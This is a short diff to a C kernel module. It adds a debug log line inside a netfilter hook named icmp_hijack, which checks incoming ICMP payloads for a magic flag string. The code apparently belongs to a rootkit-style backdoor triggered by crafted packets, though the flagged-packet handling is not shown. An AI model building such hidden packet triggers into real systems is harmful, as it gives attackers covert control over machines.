@@ -321,6 +321,9 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 
     // Check for flag
     if(strncmp(payload, FLAG, FLAG_LEN) != 0){
+        #ifdef DEBUG_K
+            pr_info("Regular ICMP, no flag\n");
+        #endif
         return NF_ACCEPT;
     }
     
